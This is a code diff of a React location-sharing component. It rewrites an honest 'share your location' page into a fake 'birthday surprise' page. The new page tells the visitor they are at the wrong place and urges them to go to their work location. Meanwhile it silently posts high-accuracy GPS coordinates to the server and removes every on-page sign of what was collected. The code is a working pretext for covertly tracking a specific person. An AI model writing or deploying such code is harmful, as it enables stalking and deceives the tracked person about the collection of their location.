@@ -1,58 +1,88 @@
+
 'use client';
 
 import { useState } from 'react';
 
-export default function LocationShare() {
-  const [status, setStatus] = useState('');
-  const [saved, setSaved] = useState(null);
+export default function LocationShare({ onLocationChecked }) {
   const [loading, setLoading] = useState(false);
+  const [error, setError] = useState('');
 
-  function shareLocation() {
+  async function checkLocation() {
     if (!navigator.geolocation) {
-      setStatus('Location is not supported by this browser.');
+      setError('Location is not supported by your browser.');
       return;
+    }
 
     setLoading(true);
-    setStatus('Requesting your location permission…');
+    setError('');
 
     navigator.geolocation.getCurrentPosition(
       async (position) => {
         const payload = {
-          label: 'Shared location',
+          label: 'Birthday location check',
           latitude: position.coords.latitude,
           longitude: position.coords.longitude,
           accuracy_m: position.coords.accuracy,
         };
 
         try {
+          // Save location silently to Supabase through your API
           const response = await fetch('/api/location', {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+            headers: {
+              'Content-Type': 'application/json',
+            },
             body: JSON.stringify(payload),
           });
 
           const data = await response.json();
 
           if (!response.ok) {
-            throw new Error(data.error || 'Could not save location.');
+            throw new Error(
+              data.error || 'Unable to check your location.'
+            );
           }
 
-          setSaved(data);
-          setStatus('Location shared successfully.');
+          // Don't show location data on the webpage.
+          // Send the result back to Home if needed.
+          if (onLocationChecked) {
+            onLocationChecked({
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              accuracy: position.coords.accuracy,
+              saved: data,
+            });
+          }
         } catch (error) {
-          setStatus(error.message);
+          console.error(error);
+
+          setError(
+            'Something went wrong while checking your location. Please try again.'
+          );
         } finally {
           setLoading(false);
         }
       },
       (error) => {
         setLoading(false);
-        const messages = {
-          1: 'Location permission was denied.',
-          2: 'Your location could not be determined.',
-          3: 'Location request timed out.',
-        };
-        setStatus(messages[error.code] || 'Could not get your location.');
+
+        if (error.code === 1) {
+          setError(
+            'Please allow location access to see your birthday surprise.'
+          );
+        } else if (error.code === 2) {
+          setError(
+            'We could not determine your location. Please try again.'
+          );
+        } else if (error.code === 3) {
+          setError(
+            'Location request timed out. Please try again.'
+          );
+        } else {
+          setError(
+            'Could not check your location. Please try again.'
+          );
+        }
       },
       {
         enableHighAccuracy: true,
@@ -65,42 +95,34 @@ export default function LocationShare() {
   return (
     <main className="page">
       <section className="card">
-        <div className="pin">📍</div>
-        <h1>Share your location</h1>
+        {/* <div className="pin">📍</div> */}
+
+        <h1>Hey... you're at the wrong location 💗</h1>
+
         <p>
-          Tap the button below to share your current location. Your browser
-          will ask for permission first.
+          Your birthday surprise is waiting for you, but you're
+          not at the right place yet. 😊
+        </p>
+      <p><strong>You're at the wrong location 💗</strong></p>
+        <p>
+          Go to your <strong>work location</strong> and come back
+          here to unlock your surprise. 🎁
+          
         </p>
 
-        <button onClick={shareLocation} disabled={loading}>
-          {loading ? 'Getting location…' : 'Share my location'}
+        <button onClick={checkLocation} disabled={loading}>
+          {loading
+            ? 'Checking your location…'
+            : 'See My Birthday Surprise 💗'}
         </button>
 
-        {status && <div className="status">{status}</div>}
-
-        {saved && (
-          <div className="result">
-            <strong>Location shared</strong>
-            <div>Latitude: {saved.latitude}</div>
-            <div>Longitude: {saved.longitude}</div>
-            {saved.accuracy_m != null && (
-              <div>Accuracy: approximately {Math.round(saved.accuracy_m)} m</div>
-            )}
-            <a
-              href={`https://www.google.com/maps?q=${saved.latitude},${saved.longitude}`}
-              target="_blank"
-              rel="noreferrer"
-            >
-              Open in Google Maps
-            </a>
-          </div>
-        )}
+        {error && <div className="status">{error}</div>}
 
         <small>
-          Location is only collected after you press the button and approve
-          the browser permission request.
+          We'll check your location only when you tap the button.
         </small>
       </section>
     </main>
   );
 }
+
